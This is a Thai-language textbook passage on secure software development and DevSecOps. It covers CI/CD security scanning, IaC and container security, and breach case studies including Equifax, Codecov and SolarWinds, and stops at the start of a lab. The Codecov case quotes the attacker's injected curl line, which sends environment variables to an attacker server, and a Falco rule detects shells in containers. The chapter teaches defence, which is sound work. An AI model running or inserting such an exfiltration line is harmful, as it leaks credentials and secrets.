#### 3.4.4 การบูรณาการ SAST/DAST/SCA ใน CI/CD Pipeline

Pipeline ตัวอย่างสำหรับ GitLab CI/CD ที่มี Security Testing Stage:

```yaml
# .gitlab-ci.yml — DevSecOps Pipeline
stages:
  - build
  - test
  - security-scan
  - deploy

variables:
  DOCKER_IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA

before_script:
  - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY

build:
  stage: build
  script:
    - docker build -t $DOCKER_IMAGE .
    - docker push $DOCKER_IMAGE

# SAST — Static Analysis
sast:
  stage: security-scan
  script:
    - docker run --rm -v $(pwd):/src returntocorp/semgrep
      semgrep --config=p/owasp-top-ten --error .
  artifacts:
    reports:
      sast: gl-sast-report.json

# SCA — Dependency Scanning
dependency_scanning:
  stage: security-scan
  script:
    - trivy fs --format gitlab --output gl-sca-report.json .
  artifacts:
    reports:
      dependency_scanning: gl-sca-report.json

# Container Scanning
container_scanning:
  stage: security-scan
  script:
    - trivy image --severity CRITICAL,HIGH --exit-code 1 $DOCKER_IMAGE
  artifacts:
    reports:
      container_scanning: gl-container-scanning-report.json

# DAST — Dynamic Analysis
dast:
  stage: security-scan
  script:
    - docker run --rm -v $(pwd):/zap/wrk owasp/zap2docker-stable
      zap-baseline.py -t https://staging.example.com -r dast_report.html
  artifacts:
    paths:
      - dast_report.html

deploy:
  stage: deploy
  script:
    - kubectl set image deployment/myapp myapp=$DOCKER_IMAGE
  only:
    - main
```

**ตาราง: Security Tools ที่ควรมีในแต่ละ Stage ของ Pipeline:**

| Stage | เครื่องมือ | สิ่งที่ตรวจสอบ |
|-------|-----------|--------------|
| **Code Commit** | Pre-commit Hooks, Git Hooks | Secrets Leak, Code Format, Simple Lint |
| **Build** | Semgrep, SonarQube (SAST) | Source Code Vulnerabilities |
| **Dependency** | Trivy, Snyk, OWASP DC (SCA) | Known Vulnerabilities in Library |
| **Container Build** | Trivy, Anchore, Docker Scout | OS/App Vulnerabilities in Image |
| **IaC Scan** | Checkov, tfsec, Terrascan | Misconfiguration in Terraform/CloudFormation |
| **Deploy to Staging** | OWASP ZAP, Nikto (DAST) | Runtime Vulnerabilities |
| **Pre-Production** | Nuclei, Custom Scripts | ความปลอดภัยทั่วไป |
| **Production Monitoring** | Falco, WAF, SIEM | Runtime Anomaly Detection |

#### 3.4.5 Infrastructure as Code (IaC) Security

IaC Security คือการสแกน Configuration ของ Terraform, CloudFormation, Kubernetes Manifest ก่อน Deploy เพื่อค้นหา Misconfiguration

**เครื่องมือ IaC Security:**

| เครื่องมือ | ภาษา/Platform ที่รองรับ | จุดเด่น |
|-----------|------------------------|---------|
| **Checkov** (Bridgecrew) | Terraform, CloudFormation, K8s, ARM, Ansible | 500+ Built-in Policies, Open Source |
| **tfsec** | Terraform | เฉพาะ Terraform, Static Analysis |
| **Terrascan** | Terraform, K8s, Helm, ARM | Open Source, Policy-as-Code |
| **Kics** (Checkmarx) | Terraform, K8s, Docker, Ansible, CloudFormation | SAST สำหรับ IaC |
| **Regula** (Fugue) | Terraform (ใช้ OPA) | ใช้ OPA Rego Policy |

**ตัวอย่าง Misconfiguration ที่ตรวจพบโดย IaC Scanning:**

```hcl
# ไม่ปลอดภัย: S3 Bucket เปิดให้สาธารณะ
resource "aws_s3_bucket" "data" {
  bucket = "company-sensitive-data"
  acl    = "public-read"  # ⛔ เปิดให้ทุกคนอ่านได้!
}

# ปลอดภัย: S3 Bucket ปิด Public Access
resource "aws_s3_bucket" "data" {
  bucket = "company-sensitive-data"
  acl    = "private"  # ✅ เฉพาะ Authorized User เท่านั้น
}

resource "aws_s3_bucket_public_access_block" "block" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

#### 3.4.6 Container Security (ความปลอดภัยของ Container)

Container Security ครอบคลุมทั้งความปลอดภัยของ Image และ Runtime Protection

**Image Security (ความปลอดภัยของ Image):**
- **เลือก Base Image ที่ปลอดภัย:** ใช้ Official Image, Minimal Image (Alpine, Distroless)
- **สแกน Image:** Trivy, Docker Scout, Anchore
- **Sign Image:** ใช้ Docker Content Trust (Notary) หรือ Cosign (Sigstore)
- **ตรวจสอบ Software Bill of Materials (SBOM):** ใช้ Syft, Trivy

**Runtime Protection (การป้องกันขณะทำงาน):**
| เครื่องมือ | คำอธิบาย |
|-----------|----------|
| **Falco** (CNCF) | Runtime Security — ตรวจจับ behavior ผิดปกติ เช่น shell ใน container, reverse shell |
| **AppArmor** | Linux Security Module — จำกัด program capability (profile-based) |
| **Seccomp** | Secure Computing Mode — จำกัด system call ที่ container เรียกใช้ได้ |
| **SELinux** | MAC (Mandatory Access Control) สำหรับ Container |
| **Aqua Security** | Enterprise Container Security Platform |

**ตัวอย่าง Falco Rule:**
```yaml
# Falco Rule — ตรวจจับการเปิด Shell ใน Container
- rule: Terminal shell in container
  desc: A shell was spawned in a container with an attached terminal
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
    and container_entrypoint != "bash"
  output: >
    Shell spawned in container (user=%user.name container=%container.name
    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)
  priority: WARNING
  tags: [container, shell]
```

**แนวปฏิบัติ Container Security:**
1. **ใช้ Minimal Base Image:** Alpine (5MB) หรือ Distroless — ลด Attack Surface
2. **ไม่รันด้วย Root:** ใช้ `USER` directive ใน Dockerfile
3. **Immutable Filesystem:** ใช้ Read-Only Root Filesystem
4. **ไม่มี Privileged Container:** ห้ามใช้ `--privileged` flag
5. **จำกัด Resource:** ใช้ `--memory`, `--cpus` — ป้องกัน DoS
6. **Network Policy:** จำกัด Network Traffic ระหว่าง Pod (Kubernetes Network Policy)
7. **Registry Security:** สแกน Image Registry อย่างสม่ำเสมอ
8. **Regular Image Updates:** Rebase Image บ่อยๆ เพื่อรับ Security Patch

---

## Keywords

Secure SDLC, Shift Left Security, Microsoft SDL, OWASP SAMM, NIST SSDF SP 800-218, DevSecOps, Security as Code, Policy as Code, Compliance as Code, CI/CD Pipeline Security, SAST, DAST, SCA, Security Debt, MTTR, STRIDE Threat Modeling, Abuse Cases, Security Requirements Engineering, Security Stories, Security Acceptance Criteria, Attack Surface Analysis, Secure Coding Standards, CERT Secure Coding, OWASP ASVS, Fuzz Testing, Penetration Testing, Container Security, Image Scanning, Runtime Protection, Falco, OPA, Rego, Sentinel, Infrastructure as Code Security, Checkov, tfsec, Trivy, Semgrep, Software Supply Chain Security, SBOM, Incident Response Plan, Patch Management, Vulnerability Management Lifecycle, Continuous Monitoring, SIEM, EDR, SBOM, BSIMM, Defense in Depth, Zero Trust, Security Champion, Continuous SDL

---

## มาตรฐานอ้างอิง (Standards Reference)

เนื้อหาในบทนี้สัมพันธ์กับมาตรฐานและกรอบแนวคิดด้านความปลอดภัยดังต่อไปนี้:

| หัวข้อ | มาตรฐาน / กรอบแนวคิดที่เกี่ยวข้อง |
|-------|---------------------------------|
| **Shift Left Security / Cost of Fixing Bugs** | IBM Systems Sciences Institute (Dawson et al., 2010), NASA Cost of Fixing Errors Study (2010), NIST SP 800-218 |
| **Microsoft SDL** | Microsoft SDL Process Guidance v5.2 (2024), Microsoft Continuous SDL White Paper (2024), MSDN Magazine "A Look Inside SDL" (2005) |
| **OWASP SAMM** | OWASP SAMM v2.0 (2020), OWASP SAMM Quick Start Guide, OWASP Developer Guide |
| **NIST SSDF** | NIST SP 800-218 v1.1 (2022), NIST SP 800-218A (AI Profile, 2024), EO 14028 (2021) |
| **Threat Modeling** | Microsoft STRIDE Methodology, OWASP Threat Modeling Guide, CAPEC (Common Attack Pattern Enumeration and Classification) |
| **Secure Coding** | CERT Secure Coding Standards (SEI/CMU), OWASP ASVS v4.0, OWASP Top 10 (2021) |
| **Security Testing** | OWASP Testing Guide v4, NIST SP 800-115 (Technical Guide to Information Security Testing), PCI DSS v4.0 (Requirement 6: Secure Coding and Testing) |
| **Policy as Code** | OPA (CNCF Graduated, 2021), OPA 1.0 (2024), HashiCorp Sentinel |
| **Compliance / Regulatory** | NIST SP 800-53 Rev. 5, ISO 27001:2022, GDPR (Art. 25, 32), PDPA (Thailand), PCI DSS v4.0, CIS Benchmarks |
| **Incident Response** | NIST SP 800-61 Rev. 2 (Computer Security Incident Handling Guide), ISO 27035 |
| **Container Security** | NIST SP 800-190 (Application Container Security Guide), CIS Docker Benchmark, Kubernetes Security (NSA/CISA 2022) |
| **DevSecOps / CI/CD** | NIST SSDF PO.3 (Supporting Toolchains), OWASP DevSecOps Guideline, BSIMM16 (Black Duck, 2026) |
| **Vulnerability Management** | CISA KEV Catalog, EPSS (Exploit Prediction Scoring System), CVSS v3.1/v4.0, NIST SP 800-40 (Guide to Enterprise Patch Management) |
| **Software Supply Chain** | EO 14028 Section 4e, NIST SSDF PS.3 (Archive Releases), OWASP CycloneDX, SPDX (SBOM Standards), Sigstore (Code Signing) |

---

## กรณีศึกษา

### กรณีศึกษา 1: Microsoft SDL Implementation — การลดช่องโหว่ด้วย Secure Development Lifecycle

**ปีที่เริ่มใช้:** 2004 (หลังจาก Bill Gates Trustworthy Computing Memo, 2002)
**ผลิตภัณฑ์แรกที่ผ่าน SDL:** Visual Studio 2005, SQL Server 2005, BizTalk Server 2006 (พฤศจิกายน 2005)
**ผลลัพธ์:** ลด Security Defects ได้ 50–60% ทุกผลิตภัณฑ์ที่ผ่าน SDL

**เบื้องหลัง:**
ก่อนปี 2002 Microsoft มีชื่อเสียงด้านความปลอดภัยที่ย่ำแย่ — ไวรัส Blaster (2003) และ Sasser (2004) ที่โจมตี Windows ทำให้เกิดความเสียหายไปทั่วโลก Bill Gates ส่ง memo "Trustworthy Computing" เมื่อวันที่ 15 มกราคม 2002 ประกาศให้ความปลอดภัยเป็น "Highest Priority" และสั่งให้พนักงาน Windows ทุกคนหยุดพัฒนาเพื่อไปฝึกอบรมความปลอดภัย (Security Push) เป็นเวลาหลายสัปดาห์

**ขั้นตอนการดำเนินการ:**
1. **ฝึกอบรม:** พัฒนา Essential Software Security Training สำหรับนักพัฒนาทุกคน
2. **กำหนดมาตรฐาน:** สร้าง Security Guidelines, Banned Function Calls List
3. **สร้าง Tooling:** พัฒนา PREfast (Static Analysis สำหรับ C/C++) และ FxCop (สำหรับ .NET)
4. **ปรับ Process:** เพิ่ม Security Activities ในทุก Phase ของ Development
5. **วัดผล:** กำหนด Security Bug Bar และ Quality Gates

**ผลลัพธ์ที่เป็นรูปธรรม:**
- **Windows Server 2003** (ผ่าน SDL บางส่วน) เทียบกับ Windows 2000 (ไม่ผ่าน SDL): ลด Critical/Important Vulnerabilities ได้ 63% ในปีแรกหลัง Release (Microsoft SDL FAQ)
- **IIS 6.0:** มีเพียง 1 Security Vulnerability หลัง Release และเป็น Feature ที่ปิดโดย Default (ZDNet, กันยายน 2005)
- **SQL Server 2005:** 0 Vulnerabilities ใน 24 เดือนหลังจาก Service Pack 3
- **โดยรวม (2004–2010):** Security Defects ลดลง 50–60% ในทุกผลิตภัณฑ์ที่ผ่าน SDL

**คำถามสำหรับการอภิปรายในชั้นเรียน:** ทำไม Microsoft ต้อง "หยุด" การพัฒนาทั้งองค์กรเพื่อจัดลำดับความสำคัญด้านความปลอดภัย? ถ้านักศึกษาเป็น CTO ของบริษัทซอฟต์แวร์ จะทำอย่างไรถ้า Competitor กำลังพัฒนาฟีเจอร์แซงหน้า แต่ระบบของเรามีช่องโหว่รุนแรง?

---

### กรณีศึกษา 2: Equifax Data Breach (2017) — Failure of Patch Management ใน Operations Phase

**ปีที่เกิดเหตุการณ์:** พฤษภาคม – กรกฎาคม 2560 (ตรวจพบ 29 กรกฎาคม 2560)
**ประเภทการโจมตี:** Known Vulnerability Exploitation (Apache Struts CVE-2017-5638)
**จำนวนผู้ได้รับผลกระทบ:** 147 ล้านคน (สหรัฐฯ)
**ความเสียหาย:** อย่างน้อย 1.38 พันล้านเหรียญสหรัฐ — รวมค่าปรับ FTC $575 ล้าน (ก.ค. 2019), ค่าใช้จ่ายด้าน IT Security $1 พันล้าน (5 ปี), ค่าชดเชยผู้บริโภค

**สาเหตุของเหตุการณ์:**
เมื่อวันที่ 7 มีนาคม 2017 Apache Software Foundation ประกาศช่องโหว่ CVE-2017-5638 ใน Apache Struts framework (Remote Code Execution ผ่าน Content-Type Header) และออก Patch ในวันเดียวกัน

- **8 มีนาคม 2017:** US-CERT (United States Computer Emergency Readiness Team) แจ้งเตือน Equifax
- **9 มีนาคม 2017:** ทีม GTVM (Global Threat and Vulnerability Management) ของ Equifax ส่งอีเมลถึงพนักงาน 400+ คน สั่งให้ Patch ภายใน 48 ชั่วโมง
- **16 มีนาคม 2017:** ทีม GTVM จัดประชุมเกี่ยวกับช่องโหว่นี้
- **พฤษภาคม 2017:** ผู้โจมตีใช้ช่องโหว่ Apache Struts ที่ยังไม่ได้ Patch ในระบบ ACIS (Automated Consumer Interview System) — ระบบรับข้อร้องเรียนผู้บริโภคที่พัฒนาตั้งแต่ปี 1970
- **29 กรกฎาคม 2017:** Equifax ตรวจพบ Traffic ผิดปกติใน Network
- **กันยายน 2017:** Equifax ประกาศเหตุการณ์ต่อสาธารณะ

**ความล้มเหลวใน Secure SDLC:**

| ขั้นตอน SDLC | ความล้มเหลว |
|-------------|-------------|
| **Operations — Patch Management** | หัวหน้าแผนก (Graeme Payne) ไม่ Forward อีเมลแจ้ง Patch ไปยังผู้ที่รับผิดชอบระบบ ACIS — Patch 60 ล้มเหลวเพราะ Human Error |
| **Operations — Vulnerability Scanning** | ไม่มีกระบวนการตรวจสอบว่าการ Patch เกิดขึ้นจริงหรือไม่ — มี Policy แต่ไม่มี Enforcement |
| **Operations — Network Segmentation** | ระบบ ACIS (Internet-Facing) เชื่อมต่อกับ Database ที่มีข้อมูล 147 ล้านคน — ขาด Network Segmentation |
| **Operations — Monitoring** | Attackers อยู่ใน Network เป็นเวลาหลายเดือน — ไม่มีการตรวจจับ |
| **Operations — Certificate Management** | มี Certificate ที่หมดอายุ 300+ ใบ รวมถึง 79 ใบที่ใช้ Monitoring Business-Critical Domains |
| **Design — Least Privilege** | Credentials ถูกเก็บใน Plain Text และให้สิทธิ์เข้าถึง Database ขนาดใหญ่ |

**ผลที่ตามมา:**
- **Graeme Payne (SVP):** ถูกไล่ออก (2 ตุลาคม 2017) — สาเหตุ "Failure to Forward Email"
- **Richard Smith (CEO):** ลาออก (26 กันยายน 2017)
- **CSO และ CIO:** เกษียณก่อนกำหนด (15 กันยายน 2017)
- รายงานจาก House Oversight Committee (ธันวาคม 2018): ระบุว่ามี "Execution Gap" ระหว่าง IT Policy Development และ Operation — นโยบายมี แต่ไม่มีการนำไปปฏิบัติจริง
- มูลค่าหุ้น Equifax: ตกกว่า 17% หลังประกาศผลประกอบการ Q3 2018

**บทเรียนที่ได้:**
1. **Patch Management ต้องมี Verification** — ไม่ใช่แค่สั่งให้ Patch แต่ต้องตรวจสอบว่า Patch สำเร็จจริง
2. **Human Process ล้มเหลวได้เสมอ** — ต้องมี Automation และ Redundancy
3. **Network Segmentation ช่วยจำกัดวง:** ถ้า ACIS ถูกแยกจาก Database หลัก ความเสียหายจะน้อยกว่านี้
4. **Vulnerability Management ต้อง Continuous** — ไม่ใช่ทำครั้งเดียวแล้วจบ

**คำถามสำหรับการอภิปรายในชั้นเรียน:** เหตุการณ์ Equifax เกิดจาก "Human Error" (พนักงานไม่ Patch) หรือ "Systemic Failure" (กระบวนการ Patch Management ที่ไม่มี Verification)? ถ้านักศึกษาต้องออกแบบระบบ Patch Management ที่ "Proof Against Human Error" จะออกแบบอย่างไร?

---

### กรณีศึกษา 3: Codecov Breach (2021) — CI/CD Pipeline Supply Chain Attack

**ปีที่เกิดเหตุการณ์:** 31 มกราคม – 1 เมษายน 2564 (ตรวจพบ 1 เมษายน 2564)
**ประเภทการโจมตี:** Supply Chain Attack (Docker Image Error → GCS Key Theft → Bash Uploader Modification)
**จำนวนผู้ได้รับผลกระทบ:** 29,000+ องค์กร รวมถึงลูกค้าชั้นนำ (ไม่เปิดเผยชื่อทั้งหมด)
**ความเสียหาย:** Credentials, Tokens, Keys ของหลายพันองค์กรถูกรั่วไหล — ค่าเสียหายยังไม่สามารถประเมินได้ทั้งหมด

**สาเหตุของเหตุการณ์:**
Codecov เป็น platform สำหรับวัด Code Coverage (คุณภาพของการทดสอบ) ที่มีลูกค้า 29,000+ องค์กร ผู้โจมตีสามารถ:

1. **ขั้นตอนที่ 1:** ใช้ Error ใน Docker Image Creation Process ของ Codecov Self-Hosted — Intermediate Layer ใน Docker Image มี HMAC Key สำหรับ Google Cloud Storage (GCS) Service Account
2. **ขั้นตอนที่ 2:** ใช้ GCS Key เพื่อเข้าถึง Bash Uploader Script ใน GCS Bucket
3. **ขั้นตอนที่ 3:** แก้ไข Bash Uploader Script โดยเพิ่มโค้ดต่อไปนี้ (บรรทัด 525):

```bash
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://<attacker-server>/upload/v2 || true
```

4. **ขั้นตอนที่ 4:** Script ที่ถูกแก้ไขจะส่ง Environment Variables ทั้งหมด (รวมถึง Credentials, Tokens, API Keys) ไปยัง Server ของผู้โจมตี

**การตรวจพบ:**
ลูกค้าของ Codecov สังเกตว่า SHA256 Checksum ของ Bash Uploader บน GitHub ไม่ตรงกับ Checksum ที่คำนวณจาก File ที่ดาวน์โหลด — แสดงว่า File ถูกแก้ไขโดยไม่ได้รับอนุญาต

**ความล้มเหลวใน Secure SDLC:**

| ขั้นตอน SDLC | ความล้มเหลว |
|-------------|-------------|
| **Implementation — Secure Build** | Docker Image Creation ไม่ได้ Squash Layers — ทำให้ Credentials หลุดรอดไปใน Image ที่เผยแพร่ |
| **Implementation — SAST/Secrets Scanning** | ไม่มี Secrets Scanning ใน CI/CD — ไม่รู้ว่ามี Credentials ใน Image Layer |
| **Deployment — Configuration Review** | Service Account Key ที่ใช้ Upload Script มี Permission มากเกินไป |
| **Operations — Integrity Monitoring** | ไม่มีการ Monitor การเปลี่ยนแปลงของ Bash Uploader Script |
| **Operations — Incident Response** | ผู้โจมตีอยู่ในระบบ 3 เดือน ก่อนถูกตรวจพบ |
| **Verification — Code Signing** | Bash Uploader ไม่มีการเซ็นด้วย GPG หรือ Code Signing Certificate |

**บทเรียนที่ได้:**
1. **Docker Image ต้อง Squash Layers** — ทุก Layer ที่มี Secrets ต้องถูก Squash หรือใช้ Multi-Stage Build
2. **GCS Key ที่ใช้ Upload Public Script ต้องมี Permission เฉพาะที่จำเป็น** — Least Privilege สำหรับ Service Account
3. **Integrity Monitoring สำหรับไฟล์สำคัญ** — ทุกการเปลี่ยนแปลงไฟล์ที่แจกจ่ายสาธารณะควรมี Alert
4. **Code Signing** — ไฟล์ที่แจกจ่ายควรมีการเซ็นเพื่อยืนยันแหล่งที่มา
5. **SBOM และ Checksum Verification** — ผู้ใช้ควรตรวจสอบ Checksum ทุกครั้งก่อนรัน Script
6. **CI/CD Secrets Management** — CI/CD Pipeline ควรใช้ Short-Lived Token และจำกัด Scope

**คำถามสำหรับการอภิปรายในชั้นเรียน:** ถ้านักศึกษารัน CI/CD Pipeline ที่ใช้ Tool จาก Third-Party (เช่น Codecov, SonarQube, Snyk) นักศึกษาจะมั่นใจได้อย่างไรว่า Tool เหล่านั้นไม่ถูกโจมตีแบบ Supply Chain Attack? มาตรการอะไรบ้างที่ช่วยลดความเสี่ยง?

---

### กรณีศึกษา 4: Capital One DevSecOps Transformation (2019–2024) — การพลิกฟื้นหลัง Data Breach

**ปีที่เกิดเหตุการณ์ Breach:** มีนาคม – กรกฎาคม 2562
**ปีที่เริ่ม Transformation:** 2019 (หลัง Breach) — จริงๆ Capital One เริ่ม Transformation ด้าน Cloud มาตั้งแต่ 2015
**จำนวนผู้ได้รับผลกระทบ (Breach):** 106 ล้านคน
**ความเสียหาย (Breach):** $190 ล้าน (ค่าปรับและค่าเสียหาย)

**เบื้องหลัง:**
ในปี 2019 Capital One ถูกโจมตีผ่าน SSRF (Server-Side Request Forgery) ทำให้ผู้โจมตีเข้าถึง AWS Metadata Endpoint และ Assume IAM Role ที่มีสิทธิ์เข้าถึง S3 Buckets ข้อมูล 106 ล้านคนรั่วไหล (เหตุการณ์นี้ถูกกล่าวถึงในรายละเอียดในกรณีศึกษาที่ 4 ของบทที่ 2)

**การเปลี่ยนแปลงหลัง Breach (DevSecOps Transformation):**

Capital One ไม่ได้ย่อท้อต่อเหตุการณ์ — กลับใช้เป็น Catalyst ในการเปลี่ยนแปลงครั้งใหญ่:

**1. "You Build, You Own" Model:**
- นักพัฒนาต้องรับผิดชอบ Security ของโค้ดตนเอง
- สร้าง Culture ที่ Developer มี Ownership ตั้งแต่ Development ถึง Production
- ใช้ Security Champions ในทุกทีม

**2. Centrally Orchestrated Pipeline (Enterprise CI/CD):**
- สร้าง Pipeline กลาง (Single Unified Pipeline) สำหรับทั้งองค์กร
- มี Certified Template ที่ผ่าน Compliance — ทุกทีมใช้ Template เดียวกัน
- Pipeline มี Immutable Stages — ทุก Stage ผ่าน Automation

**3. Security Baked into Pipeline:**
- Automated Vulnerability Scanning ทุก Build
- SAST, DAST, SCA ทำงานโดยอัตโนมัติ
- Compliance Check เป็น Automated Gate — ไม่ใช่ Manual Review

**4. Infrastructure as Code (IaC) + Policy as Code:**
- ทุก Infrastructure ต้องเป็น Code (Terraform)
- มี Policy Gate ก่อน Deploy — ตรวจสอบ Security Misconfiguration
- ใช้ Open Policy Agent (OPA) สำหรับ Policy Enforcement

**5. Container Security Automation:**
- ใช้ Qualys Container Security สำหรับ Image Scanning
- ใช้ Trivy สำหรับ Vulnerability Scanning
- ติดตั้ง Cloud Agent บนทุก AMI (95% Coverage)

**6. คุณภาพและความเร็วที่เพิ่มขึ้น:**
- จำนวน Deployment ต่อวันเพิ่มขึ้น
- Mean Time to Resolve (MTTR) Incidents ลดลง
- Developer Experience ดีขึ้น — Focus on Innovation ไม่ใช่ Process Overhead

**ผลลัพธ์ (ข้อมูลจาก Capital One Tech Blog และ Qualys Customer Story):**
- 95% Coverage ของ IP Addresses สำหรับ Security Assessment
- ลดเวลา Security Certification ของ AMI จากหลายวันเหลือเป็นนาที
- DevOps Team สามารถ Run Scans ได้ด้วยตนเอง — ไม่ต้องรอ Security Team
- Developer Satisfaction เพิ่มขึ้น — Security Team เปลี่ยนจาก "Gatekeeper" เป็น "Enablement"

**บทเรียนที่ได้:**
1. **Security ไม่ใช่ Bottleneck ถ้าถูก Automate:** Capital One ทำให้ Security เป็นส่วนหนึ่งของ Pipeline — Developer ไม่ต้องรอ Security Team
2. **Centralized Pipeline + Certified Templates:** ช่วยให้ Compliance เป็นไปโดยอัตโนมัติ — ไม่ต้องตรวจทีละ Project
3. **คุณภาพกับความเร็วไปด้วยกันได้:** Pipeline ที่ดีช่วยเพิ่มทั้งความเร็วและความปลอดภัย
4. **การพลิกวิกฤตเป็นโอกาส:** Capital One ใช้ Data Breach เป็น Catalyst ในการเปลี่ยนแปลงวัฒนธรรมและเทคโนโลยี

**คำถามสำหรับการอภิปรายในชั้นเรียน:** Capital One เลือกใช้แนวทาง "Centralized Pipeline" (Pipeline เดียวทั้งองค์กร) — มีข้อดีข้อเสียอย่างไรเมื่อเทียบกับ "Decentralized Pipeline" (แต่ละทีมเลือก Pipeline ของตนเอง)? แบบไหนเหมาะกับองค์กรขนาดเล็กกว่า?

---

### กรณีศึกษา 5: SolarWinds Orion (2020) — Supply Chain Attack ผ่าน Build Pipeline

**ปีที่เกิดเหตุการณ์:** กันยายน 2019 – ธันวาคม 2020 (ตรวจพบ ธันวาคม 2020)
**ประเภทการโจมตี:** Supply Chain Attack (Build Pipeline Compromise → Trojanized Update)
**จำนวนผู้ได้รับผลกระทบ:** 18,000+ องค์กร — รวมถึง US Federal Agencies (Treasury, Justice, State, DHS, Energy, etc.)
**ความเสียหาย:** ยังไม่สามารถประเมินได้ทั้งหมด — คาดว่าหลายพันล้านเหรียญสหรัฐ
**ผู้โจมตี:** เชื่อว่าเป็น Nation-State Actor (สหรัฐฯ ระบุว่าเป็น APT จากรัสเซีย — Nobelium / Cozy Bear / APT29)

**ลำดับเหตุการณ์:**

1. **กันยายน 2019:** ผู้โจมตีเข้าถึงระบบภายในของ SolarWinds — เริ่ม Reconnaissance
2. **ตุลาคม 2019:** Orion Platform Release 2019.4 มี Modification เพื่อทดสอบความสามารถในการ Insert Code
3. **กุมภาพันธ์ 2020:** ผู้โจมตีแทรก SUNBURST Backdoor เข้าไปใน Build Pipeline ของ Orion Platform
4. **มีนาคม – ธันวาคม 2020:** Orion Updates ที่มี Backdoor ถูกแจกจ่ายให้ลูกค้า 18,000+ ราย — Update ถูกเซ็นด้วย Code Signing Certificate ที่ถูกต้องของ SolarWinds
5. **มิถุนายน 2020:** ผู้โจมตีลบร่องรอยออกจาก Build Environment
6. **12 ธันวาคม 2020:** FireEye (ซึ่งเป็นลูกค้า SolarWinds) ตรวจพบ Backdoor และประกาศต่อสาธารณะ
7. **13 ธันวาคม 2020:** SolarWinds แจ้ง SEC และออก Security Advisory

**เทคนิคการโจมตี (จากรายงานของ SolarWinds, CrowdStrike, และ CISA):**

| เทคนิค | รายละเอียด |
|--------|-----------|
| **Build Pipeline Compromise** | ผู้โจมตี Insert Malicious Code (SUNBURST) เข้าไปใน Build Process ของ Orion |
| **Code Signing** | Backdoor ถูกเซ็นด้วย Code Signing Certificate ที่ถูกต้องของ SolarWinds — ดูเหมือน Software ที่ถูกต้อง |
| **Dormant Period** | Backdoor มีการ Dormant Period 2 สัปดาห์ก่อนเริ่มติดต่อ C2 Server — หลบเลี่ยง Sandbox |
| **C2 Communication** | ใช้ DNS Query ไปยัง `avsvmcloud[.]com` ที่ถูกออกแบบให้เลียนแบบ Orion Improvement Program (OIP) Traffic |
| **Selective Targeting** | C2 Server จะตอบกลับเฉพาะเป้าหมายที่ถูกเลือก — ไม่ใช่ทุกคนที่ติด Backdoor จะถูกใช้งาน |
| **Golden SAML** | ใช้ SAML Token Forging เพื่อเข้าถึงระบบโดยไม่ต้องใช้ MFA |

**ความล้มเหลวใน Secure SDLC:**

| ขั้นตอน SDLC | ความล้มเหลว |
|-------------|-------------|
| **Implementation — Build Environment** | Build Server ถูกรักษาความปลอดภัยไม่ดีพอ — ผู้โจมตีเข้าถึงและแทรก Malicious Code |
| **Implementation — Code Integrity** | Source Code ถูกแก้ไขใน Build Pipeline โดยไม่ถูกตรวจสอบ |
| **Verification — Code Review** | Malicious Code ถูก Insert โดยไม่ถูกตรวจพบใน Code Review หรือ Security Review |
| **Release — Code Signing** | Code Signing Key ถูกเก็บไว้ใน Build Environment ที่ถูก Compromise — ผู้โจมตีเซ็น Backdoor ได้ |
| **Operations — Monitoring** | SolarWinds ไม่สามารถตรวจจับการเปลี่ยนแปลงใน Build Environment ได้นานกว่า 1 ปี |
| **Supply Chain Security** | ไม่มีการตรวจสอบ Third-Party Component อย่างเพียงพอ |

**บทเรียนที่ได้:**

1. **Build Pipeline Security สำคัญเท่ากับ Application Security:** ถ้า Build Pipeline ถูก Compromise Software ที่ "ปลอดภัย" ก็กลายเป็นอาวุธได้
2. **Code Signing ต้องแยกออกจาก Build Environment:** ใช้ Hardware Security Module (HSM) หรือ Air-Gapped Signing
3. **Reproducible Builds:** ควรสร้าง Build ที่สามารถ Reproduce ได้ — เพื่อตรวจสอบว่า Build Output ตรงกับ Source Code
4. **SBOM (Software Bill of Materials):** ทุกซอฟต์แวร์ควรมี SBOM เพื่อให้ผู้ใช้ตรวจสอบว่า Software มี Component อะไรบ้าง
5. **Zero Trust ใน Supply Chain:** อย่าไว้ใจ Vendor หรือ Third-Party Component โดยอัตโนมัติ
6. **Incident Response ต้องมี Playbook สำหรับ Supply Chain Attack:** การโจมตีแบบนี้มีลักษณะเฉพาะที่แตกต่างจาก Attack ทั่วไป
7. **Executive Order 14028:** เหตุการณ์นี้เป็นแรงผลักดันสำคัญให้สหรัฐฯ ออก Executive Order 14028 (พฤษภาคม 2021) ที่กำหนดให้ทุกซอฟต์แวร์ที่ขายให้รัฐบาลต้องผ่านมาตรฐานความปลอดภัย (NIST SSDF)

**ข้อเท็จจริงที่น่าสนใจ:**
- SUNBURST เป็น Backdoor ที่อยู่ในโค้ดของ SolarWinds.Orion.Core.BusinessLayer.dll — DLL ถูกเซ็นด้วย Code Signing Certificate ที่ถูกต้อง
- FireEye ตรวจพบ Backdoor เพราะ FireEye ใช้ Orion เช่นกัน — แต่ FireEye ตรวจพบบนระบบของตนเอง
- ต่อมามีการค้นพบ Malware "Supernova" ที่แยกต่างหาก — เป็น Webshell ที่ถูกวางบน Orion Server ที่มี CVE-2019-8917 ที่ยังไม่ได้ Patch

**คำถามสำหรับการอภิปรายในชั้นเรียน:** เหตุการณ์ SolarWinds แสดงให้เห็นว่าถึงแม้ซอฟต์แวร์จะ "Secure by Design" แต่ก็ยังไม่พอถ้า Build Pipeline ไม่ปลอดภัย ให้นักศึกษาออกแบบ Build Pipeline ที่ปลอดภัย — ต้องมีมาตรการอะไรบ้างเพื่อป้องกันการแทรก Malicious Code? (Hint: ให้นึกถึง Secure Build ใน OWASP SAMM และ PO.3/PW.8 ใน NIST SSDF)

---

## กิจกรรมปฏิบัติการ

### Lab 3.1: OWASP SAMM Benchmarking

**วัตถุประสงค์:** เพื่อฝึกใช้ OWASP SAMM ในการประเมินวุฒิภาวะด้านความปลอดภัยขององค์กรสมมติ และจัดทำ Roadmap สำหรับปรับปรุง

**เวลาที่ใช้:** 45–60 นาที

**โจทย์:**
